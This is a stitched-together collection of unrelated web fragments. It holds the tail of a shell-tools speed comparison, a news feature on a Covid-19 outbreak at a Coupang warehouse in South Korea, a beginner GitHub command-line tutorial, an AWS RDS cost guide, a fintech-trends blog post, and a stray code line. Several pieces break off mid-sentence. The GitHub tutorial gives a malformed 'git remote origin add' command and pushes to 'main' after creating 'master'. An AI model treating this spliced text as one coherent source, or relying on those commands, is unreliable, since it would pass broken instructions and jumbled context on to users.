put the magic of the UNIX philosophy to work using pipes: this time, tr 
was involved as well, stripping away spaces to make each row 
understandable to cut.
</p>

<p>
<b>cut + tr (GNU coreutils, 47288 bytes)</b>
</p>
<pre>cat cva_in2 | tr -s ' ' | cut -d ' ' -f 5 &gt; /dev/null

real    0m0.212s
user    0m0.371s
sys     0m0.138s
</pre>

<p>
<b>awk</b>
</p>
<pre>cat cva_in2 | awk '{print $5}' &gt; /dev/null

real    0m0.460s
user    0m0.379s
sys     0m0.225s
</pre>

<p>
<b>Python 3</b>
</p>

<pre>import sys
for l in sys.stdin: print(l.split()[4])

real    0m4.450s
user    0m3.693s
sys     0m0.934s
</pre>

<p>
Despite the extra pipe, it seems the UNIX philosophy comes out
on top this time as well.
</p>


<h3>A few notes</h3>
<p>
This is of course not an exhaustive test and proves little, if anything 
at all, about he UNIX philosophy. I just wanted to perform a simple test 
with a scenario that at least I have come across many different 
times in many different scripts and many different languages.
</p>

<p>
In a typical daily scenario, I would personally have picked awk for task 
two and saved myself a bit of typing and figuring. This would have made 
no significant impact on perceived performance, because I usually don't 
deal with very large files and in most cases, the time I spend with 
tools I'm less comfortable with far exceeds the time I then spend 
waiting for the script. Still: based on nothing but gut feeling, I 
actually expected awk to be faster or at least comparable for task two. 
So much for my gut.
</p>

<p>
For coping with more complex scenarios without resorting to a language 
proper, more pipes will have to be added and more command line utilities 
will have to be invoked if we want to keep on using tools compliant with 
the UNIX philosophy. This can likely lead to worse performance, but this 
test just goes to show (for the umpteenth time) that the tool we 
instinctively reach for to tackle a task might not be the right one.
</p>

<p><span>J</span>eon Woo-oak has the numb, strained aspect of someone forced to grieve in the public eye. It has been months since she recovered from Covid-19, but she is still nervous in public spaces, preferring to meet in a rented private study rather than a cafe. “I’m worried I might get it again,” Jeon says.</p>



<p>In late May, an outbreak of the novel coronavirus swept through a warehouse owned by the e-commerce company Coupang in Bucheon, South Korea, where Jeon, 45, worked. Jeon caught the virus and brought it home to her 23-year-old daughter and husband. She asked for their names not to be published, to protect their privacy.</p>



<p>After their diagnoses, the three shared a room at the Incheon Medical Center. They spent the first few days keeping each other in good spirits, discussing what to eat when they got out. But without warning, the infection spread to Jeon’s husband’s lungs, where the damage it inflicted appeared in X-rays as ghostly white blots. At around noon on June 7, her husband video-called from the intensive care unit, assuring Jeon that he was fine. About four hours later, he suffered cardiac arrest, then fell into a coma.&nbsp;</p>



<p>“He’s been unconscious for three months, but he’s not going to get any better at this point, so I have to move him to a long-term care facility this weekend,” says Jeon. “But they can only manage his condition there. If he develops pneumonia again, I’ll have to move him back to the hospital.”</p>



<p>Jeon began working at Coupang, the biggest player in South Korea’s e-commerce market, in April. At the time, the Bucheon facility — a<a href="http://www.hani.co.kr/arti/area/capital/946873.html"> six-story</a> refrigerator where fresh food products are stored and packaged for delivery to the surrounding greater Seoul area — was one of the few places hiring. Jeon’s husband had been furloughed, and the family was struggling to make ends meet, so she signed a three-month contract.</p>



<p>On <a href="http://www.hani.co.kr/arti/society/society_general/946782.html">the morning</a> of May 24, authorities reportedly called Coupang to notify them that a Covid-19 case had been traced back to its Bucheon warehouse. Work was suspended for three hours while the facility was disinfected. When Jeon came in later that afternoon, at 5 p.m.,&nbsp;shift managers had already made the announcement to the hundreds of workers packed into the narrow foyer. When Jeon and her colleagues asked where in the facility the infections had been traced to, they were rebuffed. “Then they told the rest of us to go to our workstations, saying we were safe,” she says.</p>



<p>Even before the outbreak, the risks of working in a windowless warehouse, where everyone breathed the same stale air, had been obvious. “We would always tell each other, ‘When it happens here, it’s going to be a complete disaster. We are all going to die,’” recalls Jeon.&nbsp;</p>



<p>She took every possible precaution, using her car instead of the employee shuttle and the stairs instead of the elevator. During her shift, she wore a mask and gloves. Not wanting to wait in the long line for the cafeteria, where people would eat crammed together with their faces uncovered, she skipped dinner. It wasn’t enough. The Bucheon warehouse carried on as usual, until the evening of May 25, almost two full working days after officials were warned of a possible outbreak. Jeon tested positive on May 26. In total, <a href="http://www.hani.co.kr/arti/society/society_general/960422.html">there were 152 Covid-19 cases traced to the warehouse</a>: 84 employees, as well as 68 others infected from subsequent contact.</p>



<p>Jeon holds the company responsible for failing to take the necessary precautions to prevent the outbreak. “I’ve told Coupang that my husband is extremely ill, and that I want both a sincere apology and compensation,” she says.</p>



<p>Coupang declined to comment.</p>



	




<p>Coupang’s apparent mishandling of the outbreak at Bucheon is embarrassing for a company that styles itself as a socially conscious innovator, one that offered delivery workers secure, full-time jobs while revolutionizing Korea’s e-commerce industry, the fifth largest in the world. But to stay ahead of its rivals, the company has driven its employees harder and harder, trying to win by turning around orders faster than anyone else. This year, at least two workers have died — in March, <a href="https://koreajoongangdaily.joins.com/news/article/article.aspx?aid=3075014&amp;cloc=joongangdaily%257Chome%257Cnewslist1">a Coupang delivery man was found dead</a> on the steps of a residence where he had been delivering packages, and in May, <a href="https://www.yna.co.kr/view/AKR20200529127100065">a worker, in their 40s, at another Coupang warehouse died</a> after collapsing in a bathroom. Warehouse workers and delivery drivers describe these deaths as the inevitable outcome of a business ethic that prioritizes rapid delivery over employee safety.</p>



<p>“Even before [the Bucheon outbreak], I’d been struck by how the company seems to treat workplace injuries as a given and what I’ve perceived to be a deep-rooted and widespread problem of neglecting worker safety,” says labor researcher Jang Kwi-yeon, who has studied working conditions at Coupang. “Coupang has grown tremendously in the span of just a few years, and the intensity of work just keeps on increasing.”</p>



<p>When Covid-19 struck, and homebound consumers turned in unprecedented numbers to e-commerce, the pressure worsened, and more workers were put in harm’s way. As another former Bucheon worker told <em>Rest of World</em>: “What was bound to happen has happened.”</p>

<hr>



<p><strong>Coupang — a portmanteau</strong> of <em>coupon</em> and the sound of one going off: <em>pang!</em> — was launched in August 2010 by Kim Beom-seok, a Korean American in his early 30s, as a daily-deals “social commerce” venture modeled on Groupon. Launched with backing from <a href="https://www.thebell.co.kr/free/Content/ArticleView.asp?key=202005130817397220108943">Clayton Christensen’s Disruptive Innovation Fund</a>, it was turning a modest profit by 2012, when Kim — who goes by “Bom Kim” in English — decided to take the company public on the Nasdaq.&nbsp;</p>



<p>The weekend before the listing was due, Bom Kim pulled the plug. His vision, he had said in numerous interviews, was to create something that left customers saying, “How did I ever live without Coupang?” — and his company wasn’t that. From then on, the company would model itself not on Groupon, but on Amazon.&nbsp;</p>



<p>By 2015, Coupang had built something that surpassed even Amazon: a long, unbroken supply chain, whereby products moved seamlessly from warehouse to driver to customer, with&nbsp;99% of orders delivered within 24 hours, all year and 7 days a week. (Amazon has since made a similar delivery network.) In 2016, Coupang was <a href="https://www.technologyreview.com/lists-tr50/50-smartest-companies-2016/intro%23Coupang">named one of the 50 Smartest Companies</a> by <em>MIT Technology Review</em>. The same year, Bom Kim appeared on <em>Forbes</em>’ “Global Game Changers” list with the tagline “beating Jeff Bezos at his own game.”</p>



<p>Like Bezos, Bom Kim had rightly predicted that faster and “frictionless” delivery — not just competitive pricing and wide selections — would be the future of e-commerce. And with its dense, smartphone-friendly urban populations, South Korea was close to a perfect market. At the time, a slate of third-party marketplaces and Groupon imitators made up most of the country’s e-commerce sector.</p>



<p>“In modeling itself after Amazon by investing aggressively in its own logistical infrastructure, Coupang swooped in and set an entirely new standard for e-commerce [in South Korea],” says Im Il, a professor at the Yonsei University School of Business in Seoul. “It eventually sparked both a price war and a delivery war across the entire market.”</p>



<p>E-commerce in South Korea was dogged by a challenge common to online retail around the world. So-called last-mile delivery — the stretch of the delivery process in which the package moves from hub to consumer — was expensive, time-consuming, and unreliable when handled by third-party shipping companies. Late, damaged, or lost packages were immensely consequential to customer satisfaction but nearly always out of a retailer’s control.&nbsp;</p>



<p>Logistics, <a href="https://news.joins.com/article/19605320">Bom Kim believed</a>, was “a fight of minutes and seconds.” In 2013, Coupang acquired the data-analytics company CalmSea and began to deploy artificial intelligence to pare down delivery times. Machine learning helps the company predict consumption patterns and position stock so that it is closest to likely buyers. In its warehouses, Coupang uses the same “random-stow” system as Amazon, in which algorithms tell stockers where to store items based on purchasing patterns, rather than on category. On deliveries, artificial intelligence software plots optimal routes for drivers and tells them where and how to stack packages in the truck.&nbsp;</p>



<p>To cement Coupang’s control over the last mile, Bom Kim did something that few others in the industry wanted to: he hired his own drivers.</p>



<p>In March 2014, the company launched what has since become its crowning achievement, Rocket Delivery, <a href="https://www.hankyung.com/economy/article/202007230105i">starting with 50</a> “Coupang Men” — full-time drivers in branded trucks — who guaranteed next-day delivery of packages, which the company calls “gifts.”</p>



<p>Referred to internally as “spreaders of happiness,” Coupang Men were the spiritual ambassadors of the company. To win over female customers in their 20s and 30s — a key demographic — Coupang Men handed out flowers and handwritten cards, snapped photos of packages to confirm delivery, and would know not to ring the doorbell at homes with babies.</p>



<p>Bom Kim called them “<a href="http://news.khan.co.kr/kh_news/khan_art_view.html?artid=201503171633451&amp;utm_source=livere&amp;utm_medium=social_share">the weapon that Amazon doesn’t have</a>.” And unlike local shipping companies, which hired fleets of drivers on precarious temp contracts, Coupang Men were given a fair wage, full insurance coverage, annual health checkups, 15 vacation days a year, and company trucks and gas.&nbsp;</p>



<p>More importantly, the company offered drivers the opportunity to become “regular” employees in a line of work where this was virtually unheard of. (In South Korea, employees are divided into “regular” and “irregular” labor, with only the former receiving comprehensive legal protection.)</p>

<p>To execute this vision, Bom Kim courted talent from his competitors — including Amazon — who recognized in Coupang a similar, single-minded zeal. “I was very impressed with the strategy and control of the last mile,” Darrin Shamo, who left Amazon-owned shoe retailer …</p></div></div>

<p><a href="http://github.com/">GitHub</a> is a great tool to be used when programming, as it helps store your code over the internet. It makes your project more organized, easier to develop, and allows you to collaborate with friends or other developers. In addition, GitHub works smashingly with Visual Studio Code.</p>



<p><strong>If you’re still not recognizing a need for GitHub, do not worry  – you will soon.</strong></p>



<p>In this short tutorial, I’m going to show you how to connect your project with GitHub from the command line.</p>



<p><strong>Connecting to GitHub</strong></p>



<p>First, navigate to your project in your computer’s terminal and run:</p>



<pre><code>git init</code></pre>



<p>That will initialize your project with Git. Next, run:</p>



<pre><code>git add .</code></pre>



<p>That command will add all of your files to the git repository that we initialized in step 1. Next, run:</p>



<pre><code>git commit -m "Initial Commit"</code></pre>



<p>This commits all your files to your repository. Next, we need to set up a GitHub repository. To do this, go to <a href="http://github.com/">github.com</a> and either sign in or create an account. After that, create a new repository by clicking the “new” button on the sidebar on the left side of the screen.</p>



<figure><img loading="lazy" src="https://i2.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.29.02-AM.png?resize=337%2C105&amp;ssl=1" alt="" width="337" height="105" srcset="https://i2.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.29.02-AM.png?w=321&amp;ssl=1 321w, https://i2.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.29.02-AM.png?resize=300%2C93&amp;ssl=1 300w" sizes="(max-width: 337px) 100vw, 337px" data-recalc-dims="1"></figure>



<p>Next, give your repository a name, select if you want it to be public or private, and then click create at the bottom of the screen.</p>



<p>Now, copy the repository link from the top of the page.</p>



<figure><img loading="lazy" width="819" height="80" src="https://i1.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.32.56-AM.png?resize=819%2C80&amp;ssl=1" alt="" srcset="https://i1.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.32.56-AM.png?resize=1024%2C100&amp;ssl=1 1024w, https://i1.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.32.56-AM.png?resize=300%2C29&amp;ssl=1 300w, https://i1.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.32.56-AM.png?resize=768%2C75&amp;ssl=1 768w, https://i1.wp.com/thejavascriptninja.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-15-at-8.32.56-AM.png?w=1194&amp;ssl=1 1194w" sizes="(max-width: 819px) 100vw, 819px" data-recalc-dims="1"></figure>



<p>Then, go back to your terminal. After, run the following command:</p>



<pre><code>git branch -M master</code></pre>



<p>This creates a master branch for your repository. Finally, run:</p>



<pre><code>git remote origin add &lt;repository link&gt;</code></pre>



<p>Make sure to replace <code>&lt;repository link&gt;</code> with your GitHub repository link from above. The last thing we to do is to push all our files to GitHub! Do that with the following snippet:</p>



<pre><code>git push -u origin main</code></pre>



<p>Congrats! Now we’ve pushed our project to GitHub, and you should be able to see it if your reload your GitHub repository’s page.</p>



<p><strong>Making Changes</strong></p>



<p>However, let’s say you continue to edit your code. How can we update your GitHub repository? It can be updated with this series of commands:</p>



<pre><code>git add .
git commit -m "You Commit Message Here"

				<p>Amazon Web Services makes getting your data into their <a href="https://aws.amazon.com/rds/" target="_blank">Relational Database Service</a> (RDS) relatively easy. Import costs are free, and you can store up to <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_Limits.html#RDS_Limits.Limits" target="_blank">100 terabytes across all your instances</a>. AWS RDS hosts your relational databases in the cloud, and their engineers handle patching, monitoring, availability, and some security concerns.</p>

<p>These factors make getting started with AWS RDS easy, but understanding and controlling your costs is another matter entirely. In this article, you’ll learning the following with AWS RDS:</p>

<hr>



<p>Instance usage, storage, I/O, backups, and data transfers drive the bulk of your AWS RDS costs. Instance usage and storage are unavoidable, but generally, you should minimize them while adequately addressing your needs. AWS RDS offers some I/O and backup capability bundled into the cost of storage, but you might need more. Moving data into RDS from the internet is free, but moving it out of RDS can get expensive.</p>

<p>In this section, I’ll dive deeper into each of AWS RDS’s pricing factors to help you understand how your usage might affect your monthly bill.</p>

<h2 id="rds-database-engine">RDS Database Engine</h2>

<p>Amazon currently offers six database engines: <a href="https://aws.amazon.com/rds/aurora">Amazon Aurora</a>, <a href="https://aws.amazon.com/rds/postgresql/" target="_blank">PostgreSQL</a>, <a href="https://aws.amazon.com/rds/mysql/" target="_blank">MySQL</a>, <a href="https://aws.amazon.com/rds/mariadb/">MariaDB</a>, <a href="https://aws.amazon.com/rds/oracle/" target="_blank">Oracle</a>, and <a href="https://aws.amazon.com/rds/sqlserver/" target="_blank">Microsoft SQL Server</a>. Normally you won’t be able to change your database engine, but you can choose to optimize for memory, performance, or I/O.</p>

<p>The three open-source databases (Postgres, MySQL, and MariaDB) are similar in price. Depending on the size, PostgreSQL instances are five to ten percent more expensive per hour, but PostgreSQL, MySQL, and MariaDB share pricing for storage, provisioned I/O, and data transfer.</p>

<p>AWS Aurora is Amazon’s proprietary database, so it gets special treatment. AWS offers a <a href="https://aws.amazon.com/rds/aurora/serverless/" target="_blank">serverless option</a>, making it ideal for applications that don’t need to be on all the time, like test environments. Aurora also has a <a href="https://aws.amazon.com/rds/aurora/global-database/" target="_blank">multi-zone backup system</a> that charges per million replicated I/O operations. Storage per gibibyte (GiB) is a few cents more expensive, but if you’re dealing with intermittent usage or need fast failovers and many read replicas, Aurora can save money over implementing these features on other engines.</p>

<p>Oracle and SQL Server aren’t open-source or owned by Amazon. To accomodate licensing, hourly instances can cost nearly twice as much. You can self-license with Oracle, which brings the cost in line with open-source options. Other fees, like storage and data transfer, match their open-source counterparts.</p>

<p>While this guide isn’t intended to help you choose the best database engine, it is important to note that pricing varies based on the engine you choose.</p>

<h2 id="rds-instance-sizes">RDS Instance Sizes</h2>

<p>Once you select an engine, you have to select an RDS <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Concepts.DBInstanceClass.html" target="_blank">instance size</a> with the appropriate computational (vCPU), network (Mbps), and memory capacity (GiB RAM). RDS offers instances ranging from <code>db.t3.micro</code> (2 vCPUS, 1 GiB RAM, 2085 Mbps) to <code>db.m5.24xlarge</code> (96 vCPUS, 384 GiB RAM, 19,000 Mbps).</p>

<p>Selecting the right RDS instance size can be challenging. To estimate the RDS instance size you’ll need, estimate or track the amount of data your queries need (called your <a href="http://www.tocker.ca/2013/05/31/estimating-mysqls-working-set-with-information_schema.html" target="_blank">working set</a>), then select an instance that can fit your working set into <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_BestPractices.html#CHAP_BestPractices.Performance.RAM" target="_blank">memory</a>. I’ll touch on RDS monitoring and right-sizing your RDS instances later in this guide.</p>

<h2 id="reserved-instances">Reserved Instances</h2>

<p>Without additional configuration, RDS instances are created on-demand. These instances are billed in one-second increments from the moment the instance starts to its termination. You can stop, start, or change an on-demand <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.DBInstance.Modifying.html" target="_blank">instance size</a> at any time.</p>

<p>The alternative to on-demand pricing is <a href="https://aws.amazon.com/aws-cost-management/aws-cost-optimization/reserved-instances/" target="_blank">Reserved Instances</a> for RDS. You commit to lease an RDS instance for a set period (1 or 3+ years) in exchange for discounts up to 60%. AWS offers sizing flexibility for all Reserved Instance engines except SQL Server and License Included Oracle, allowing administrators to freely change instance size within the same family. If you’re able to commit to RDS for a year or three and have monitored your requirements enough to develop a solid performance baseline, you can save money by trading away the flexibility to turn off or downsize your databases.</p>

<h2 id="rds-storage-aurora-and-autoscaling">RDS Storage: Aurora and Autoscaling</h2>

<p>For most engines, you buy storage per GiB in advance. Aurora is the exception: you only pay for what you use. It’s important to accurately predict your monthly storage needs as you <a href="https://aws.amazon.com/premiumsupport/knowledge-center/rds-db-storage-size/">cannot reduce storage</a> on an instance (<a href="https://aws.amazon.com/about-aws/whats-new/2020/10/amazon-aurora-enables-dynamic-resizing-database-storage-space/" target="_blank">except Aurora</a>).</p>

<p>AWS can <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_PIOPS.StorageTypes.html#USER_PIOPS.Autoscaling" target="_blank">auto-scale</a> your storage when an instance has under 10% space remaining for more than 5 minutes. This option has the benefit of keeping storage costs low, but can surprise you if something unexpected happens. To protect against auto-scaling to 65,536 GiB, set a maximum storage threshold for your instance.</p>

<p><img src="https://www.cloudforecast.io/blog/assets/media/autoscaling.png" alt="Enabling a storage threshold for auto-scaling" title="RDS Aurora and Autoscaling Thresholds"></p>

<p>If you can accurately predict your storage needs, manually provisioning is the cheapest option. If you’re facing unpredictability or unused storage, consider auto-provisioning and focus on maintaining a reasonable storage maximum.</p>

<h2 id="rds-backups">RDS Backups</h2>

<p>AWS backs up 100% of the storage you’ve purchased in any zone for free. If you buy 20 GiB of storage across two instances, it includes 20 GiB of backup space.</p>

<p>If you need more space for backups, you pay per GiB at a slightly lower rate than regular storage costs. RDS automatically backs up each storage volume every day. These backups are stored according to the backup retention period. Automated backups will not occur if the DB’s state is not <code>AVAILABLE</code> (for example, if the state is <code>STORAGE_FULL</code>). Users can also create manual backups. These never expire and count against your backup storage total.</p>

<h2 id="regions">Regions</h2>

<p>As with most AWS services, RDS costs are specific to a <a href="https://aws.amazon.com/about-aws/global-infrastructure/regions_az/" target="_blank">region</a>. Choose your region carefully because the most expensive regions double the hourly cost of instances, increase storage by a few cents per GiB, and 5x inter-zone data transfer pricing.</p>

<p>On the other hand, if your database is located further from your application servers, you’ll add latency to every database call. If this latency degrades user experience, you probably don’t want to use a distant, slightly cheaper region.</p>

<h2 id="multi-az-deployments">Multi-AZ Deployments</h2>

<p>If you need availability when an AWS regional data center encounters trouble, you can enable <a href="https://aws.amazon.com/rds/features/multi-az/" target="_blank">Multi-AZ deployments</a>. This creates a backup database instance and replicates your data to a second AWS data center. Be aware that this <strong>doubles your monthly instance and storage costs</strong> but enhances the reliability of critical services. If you need a Multi-AZ deployment, focus on reducing your storage needs and instance size, these gains are won twice.</p>

<hr>



<p>Once you understand the many options RDS offers and set up an instance, there are a few tools that will help you audit your current usage and predict future requirements.</p>

<h2 id="aws-cost-explorer">AWS Cost Explorer</h2>

<p>The best way to audit your RDS spending is the <a href="https://aws.amazon.com/aws-cost-management/aws-cost-explorer/" target="_blank">AWS Cost Explorer</a>. Activating and examining your daily or monthly spend is an excellent way to visualize your organization’s priorities.</p>

<p><img src="https://www.cloudforecast.io/blog/assets/media/rds_costexplorer.png" alt="Using the AWS Cost Explorer to see your RDS spend" title="AWS Cost Explorer"></p>

<p><a href="https://www.cloudforecast.io/blog/aws-tagging-best-practices/" target="_blank">Tagging your resources</a> helps you understand which projects and teams are using which databases. Cost Explorer also offers <a href="https://docs.aws.amazon.com/savingsplans/latest/userguide/sp-recommendations.html" target="_blank">suggestions</a> for using reserved instances based on your past usage.</p>

<h2 id="rds-management-console-and-enhanced-monitoring">RDS Management Console and Enhanced Monitoring</h2>

<p>AWS provides a “Monitoring” tab in the RDS Console that displays free-tier CloudWatch metrics like the number of connections and CPU utilization. Keeping an eye on your usage in the console can help you prepare to right-size your storage or purchase reserved instances.</p>

<p><img src="https://www.cloudforecast.io/blog/assets/media/rds_cloudwatch.png" alt="Using the RDS Console to see your RDS utilization" title="CloudWatch"></p>

<p>AWS gives you the option to activate additional monitoring services.</p>

<p><a href="https://aws.amazon.com/rds/performance-insights/" target="_blank"><strong>Performance Insights</strong></a> gathers data about the database load. This tool has its own <a href="https://aws.amazon.com/rds/performance-insights/pricing" target="_blank">pricing model</a> with a free tier that includes 7-day retention.</p>

<p><a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_Monitoring.OS.html" target="_blank"><strong>Enhanced Monitoring</strong></a> is stored and priced as <a href="https://aws.amazon.com/cloudwatch/pricing/" target="_blank">CloudWatch logs</a>. It reports metrics from a user agent instead of the hypervisor, allowing you to examine running processes and the OS, which is useful for examining the resource usage of individual queries.</p>

<p>Finally, you can enable and access <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_LogAccess.html" target="_blank">database logs</a> directly for the price of storing the files.</p>

<h2 id="cloudforecast">CloudForecast</h2>

<p><a href="https://www.cloudforecast.io/" target="_blank">CloudForecast</a> supplements AWS’s Cost Explorer through proactive monitoring and optimization reports that keeps your RDS cost in check.</p>

<p>Through the <a href="https://cloudforecast.io/aws-daily-cost-report-tool.html">daily cost reports</a>, you’ll receive a daily report via email or slack that details your RDS cost in relation to your overall spend and alerts you of any cost anamolies with RDS.</p>

<p>The <a href="https://www.cloudforecast.io/aws-tagging-compliance-report.html" target="_blank">tagging compliance report</a> helps make sure your RDS instances are properly tagged and let you know exactly which RDS resources are not following compliance.</p>

<p>Finally, the <a href="https://www.cloudforecast.io/kb/docs/general-info/whatis/#aws-cost-optimization" target="_blank">ZeroWaste Health Report</a> (beta) let’s you know of possible inefficiencies by identifying all your over-provisioned and unused RDS instances in one single report.</p>

<hr>



<p>Armed with insights into your requirements and RDS’s abilities, it’s time to put cost-saving measures and AWS <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_BestPractices.html" target="_blank">best practices</a> to use. In the rest of this guide, I’ll offer some strategies for decreasing your RDS costs using the insights you gathered above.</p>

<h2 id="right-sizing-your-instances">Right Sizing your Instances</h2>

<p>In short, turn off anything that’s not being used.</p>

<p>Every month, you pay for instances and storage and the infrastructure attached to them. You can check each database’s utilization using the connections metric in the RDS Console. On-demand RDS instances can be stopped for up to 7 days. When stopped, you aren’t charged for DB Instance hours, but you are charged for storage. You can use an AWS Lambda <a href="https://docs.aws.amazon.com/lambda/latest/dg/services-cloudwatchevents-tutorial.html" target="_blank">scheduled event</a> and DB Instance API calls to programmatically stop and start instances.</p>

<p>To practice <a href="https://aws.amazon.com/aws-cost-management/aws-cost-optimization/right-sizing/" target="_blank">right-sizing</a>, act on your monitoring and …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p><span>You can read the first part of this article <a href="https://s-pro.io/blog/customer-oriented-fintech-10-key-trends-in-2021">here</a>. For those who for some reason don’t like to follow the links, let me remind you briefly: in the first part, we made a retrospective of fintech trends in 2020 and delved into the first 5 trends in 2021.</span></p>
<p><span>So what in my opinion awaits us next?</span></p>
<p><b>6. Hyper-Personalization in banking</b></p>
<p><span>Banks are moving into the segment of sales of packaged digital products and personalize various services for customer needs. For example, a personalized financial plan for a young couple, for a student, for older people, and so on.&nbsp;</span></p>
<p><span>Hyper-personalization in banking gives users more flexibility in products and services. For example, based on the relationship with the bank, credit standing, and asset base, the bank recommends to clients how they can design a loan to fit their needs. The customer chooses one of the provided interest categories, duration, payment schedule, and the amount of the first instalment.</span></p>
<p><span>To hyper-personalize its services, banks must collect and analyze data from many different sources, including all types of interaction with the customer. Analyzing this data and creating insights allow banks to hyper-personalize the interaction into a holistic relationship, which drives differentiation and increases customer loyalty.</span></p>
<p><span>If the bank can sell a complex product that will be convenient and efficient, then there is the question of interaction between banks and other companies (gyms, shops, etc.). Therefore, this requires some flexibility.</span></p>
<p><a href="https://s-pro.io/blog/how-to-build-customer-loyalty-in-digital-banking">Building Customer Loyalty in Digital Banking</a></p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2020/11/5b6b1e6389c8a12d3a8b474b.jpg" alt="" width="1100" height="956"></p>
<p><b>7. Banks are becoming more open and automated, building a distribution network</b></p>
<p><span>BaaS (Banking-as-a-service) is an industry based on open banking APIs that allow banks to lend their license and infrastructure to technology companies. Leasing banking infrastructure (license, payment processing, card issuance, compliance), instead of creating or buying it for other players, is an extremely new phenomenon but rapidly gaining momentum with the growth in the number of fintech startups.</span></p>
<p><span>We are working with a startup in Africa that recently participated in the Ecobank program. Ecobank has made a Sandbox for startups, where you can simply register, access the bank’s products (lending, card issuance, etc.), and later become a reseller of these products. The algorithm is as follows: you register a startup, register with Ecobank, receive an API for the bank’s products, integrate your product with the bank and use it. From the banks’ side the following things are happening: standardization of API, provision of platforms for product testing (Sandboxes), creation of a platform for integration, and control of their products resale process. So, such a technologically complex process is taking place.</span></p>
<p><a href="https://s-pro.io/blog/key-things-to-know-before-developing-a-mobile-only-banking-application">Key Things to Know</a> Before Developing a Mobile-Only Banking Application</p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2020/11/%D1%81%D1%82%D0%B0%D1%82%D1%82%D1%8F3_.jpg" alt="" width="2403" height="4975"></p>
<p><b>8. Strengthening automation in investment funds</b></p>
<p><span>This is a long-running story, I would say. Many investment funds offer their financial trading services not through a broker, but a program. They create a trading strategy, base the program, and the bot trades on that financial strategy. Apparently, this will intensify. Trade strategies are quite clear, as is the mechanism of their automation. And so in the future more and more players will do it.&nbsp;</span></p>
<p><span>At the same time, the entire financial market is being digitalized. If there are clear metrics that will drive the financial market (and they obviously are), then within this you can put a trading strategy in the program and trade. And this process can be correlated – to make risky strategies or not. At the same time, there is hedging, a risk insurance mechanism. A person, knowing that the bot is trading, hedges and gives % of the profits to the insurance company, which covers losses in case of bot’s loss. It’s also convenient for the investment fund because there is no need to hire additional people. Instead, they hire programmers who improve these financial strategies.</span></p>
<p><b>9. Growing demand for expertise in software development: working with Big data and high-load systems</b></p>
<p><span>Fintech companies need to work closely with developers, designers, and technicians to ensure that all new ideas and concepts are properly implemented.</span></p>
<p><span>After all, this is the industry with high-load projects, so it needs expertise in Big data or high load systems. There are many analytics and data preservation issues because it’s working with financial information. How will this affect the outsourcing and software development market? First of all, people with the right thinking approach are needed, because fintech has a demand for transformation. </span><span>Transformation is about people who can think differently</span><span>. Secondly, there is a request for quality service.&nbsp;</span></p>
<p><span>Summing up, I think that outsourcing companies need to hire the right people, focus on project management, and there must be a clear delivery mechanism. And for sure, it is extremely important to ensure a sufficient level of security.</span></p>
<h3><i><span>“Transformation is about people who can think differently</span></i><span>.”</span></h3>
<p><a href="https://s-pro.io/blog/things-we-learned-machine-learning-prague-2019">What Things We’ve Learned</a> at Machine Learning Prague 2019</p>
<p><b>10. Pandemic adaptation: remote presence and localization</b></p>
<p><span>Two contexts are emerging against the background of the COVID-19 pandemic. The first one is the </span><i><span>localization</span></i><span> of people in their work, especially in their offline activity. If before everything was moving towards globalization, now there is a trend of remote work and presence, including financial management. The second one is that companies need to work online and interact with their customers and employees remotely. At the same time, they need to have some local presence and to improve the customer experience for all their clients with an emphasis on </span><i><span>remote work</span></i><span>.&nbsp;</span></p>
<p><span>Microsoft conducted a </span><a href="https://news.microsoft.com/europe/features/flexible-ways-of-working-are-here-to-stay-finds-new-european-research-with-leaders-focused-on-maintaining-culture-and-innovation/"><span>survey</span></a><span> of 9,000 employees and business leaders in 15 European countries to learn about their remote experience and future expectations. The changes have been significant: if last year only 15% of companies had a flexible work schedule, now 76% work that way. It turned out that even after the pandemic, neither managers nor employees want to return to the old ways of doing business.</span></p>
<p><span>According to the study, Microsoft has developed guidelines for employers seeking to unleash the full potential of remote teams and teams with mixed work schedules. You can find more information in the Microsoft </span><a href="https://news.microsoft.com/europe/features/flexible-ways-of-working-are-here-to-stay-finds-new-european-research-with-leaders-focused-on-maintaining-culture-and-innovation/"><span>blog</span></a><span>.</span></p>
<p><a href="https://s-pro.io/blog/coronavirus-business-impact">Coronavirus for businesses:</a> a disaster or a tremendous opportunity?</p>
<h3><b>Conclusion</b></h3>
<p><span>In summary, let’s systematize the forecasting trends separately for B2B and B2C.&nbsp;</span></p>
<p><span>Most of the B2B products we make are data products when the data from one company are transferred to another one. In the field of lending, for example, it is the scoring of loans and their resale. I can say that the big fintech trend in 2021 for B2B is the development of products that provide data analysis.</span></p>
<p><span>According to B2C, it’s the digitization of banking services for the population, mobile banking and hybrid services to improve the customer experience. The big fintech trend in 2021 for B2C is the development of various customer experience products, onboarding products, and KYC-services.</span></p>
<p><span>Even after life returns to its usual, “non-pandemic” state, some of the behaviours started by the pandemic will continue, including those that intersect with financial technology. And this is for the better because the crisis has forced the industry to adapt to new conditions, look for new opportunities to reach users, and thus – to provide them with more comfort and benefits from the use of fintech products.</span></p>

<span>html</span> <span>+=</span> <span>"&lt;html&gt;\n"</span><span>;</span>
<span>html</span> <span>+=</span> <span>"  &lt;body&gt;\n"</span><span>;</span>
